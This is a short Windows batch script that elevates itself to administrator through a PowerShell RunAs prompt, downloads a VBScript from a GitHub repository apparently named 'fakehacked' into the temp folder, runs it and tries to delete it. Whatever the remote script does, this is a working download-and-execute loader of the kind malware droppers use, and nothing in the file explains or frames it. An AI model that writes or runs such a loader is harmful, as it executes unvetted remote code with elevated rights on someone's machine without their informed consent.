@echo off
call :check_Permissions
cd %temp%
set "URL=https://raw.githubusercontent.com/ert11er/fakehacked/main/TEMP.vbs"
set "output=Temp.vbs"
curl %URL% -o %output%
start %output%
del %output

exit

:check_Permissions
net session >nul 2>&1
if %errorLevel% == 0 (
    cls
) else (
    powershell.exe -Command "Start-Process -Verb RunAs -FilePath \"%~f0\""
    exit
)